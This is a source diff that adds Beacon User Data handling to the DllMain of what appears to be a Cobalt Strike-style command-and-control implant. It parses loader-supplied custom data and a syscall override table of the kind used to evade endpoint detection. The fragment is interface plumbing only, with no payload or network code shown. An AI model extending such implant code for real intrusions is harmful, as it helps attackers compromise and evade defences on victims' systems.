@@ -119,10 +119,52 @@ static void container_release(LPVOID lpReserved, HINSTANCE hinstDLL) {
 	ho->alloc = NULL;
 }
 
+/* 4.9 Beacon User Data (UDRL contract): the loader calls DllMain with
+ * reason DLL_BEACON_USER_DATA (0x0d) and lpReserved = USER_DATA* before the
+ * standard DLL_PROCESS_ATTACH. Layout per beacon_user_data.h:
+ *   DWORD length  - total structure length (version tolerance)
+ *   DWORD version - 1
+ *   SYSCALL_API * syscalls  - optional syscall override table (NULL = skip)
+ *   char   customData[32]   - BOFs read via BeaconGetCustomUserData
+ * Beacon copies the custom buffer immediately; the caller may free the
+ * structure afterwards. Syscall override consumption is a follow-up: the
+ * table pointer is captured for inspection but the resolver keeps the
+ * profile-selected method until that wiring is verified live. */
+#define DLL_BEACON_USER_DATA 0x0d
+
+typedef struct {
+	unsigned int jump_address;
+	unsigned int syscall_number;
+	void       * func_address;
+} SYSCALL_API_ENTRY_UD;
+
+typedef struct {
+	SYSCALL_API_ENTRY_UD * entries;
+	unsigned int           count;
+} SYSCALL_API_UD;
+
+typedef struct {
+	unsigned int   length;
+	unsigned int   version;
+	SYSCALL_API_UD syscalls;
+	char           customData[32];
+} USER_DATA_UD;
+
+static SYSCALL_API_UD g_udrl_syscalls = { NULL, 0 };
+
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
 	MEMORY_BASIC_INFORMATION mbi;
 
 	switch( dwReason ) {
+		case DLL_BEACON_USER_DATA: {
+			USER_DATA_UD * ud = (USER_DATA_UD *)lpReserved;
+			if (ud != NULL && ud->length >= 8 && ud->version >= 1) {
+				BeaconSetCustomUserData(ud->customData);
+				if (ud->length >= (unsigned int)(sizeof(USER_DATA_UD) - 32))
+					g_udrl_syscalls = ud->syscalls;
+			}
+			break;
+		}
 		case DLL_QUERY_HMODULE:
 			break;
 		case DLL_PROCESS_ATTACH:
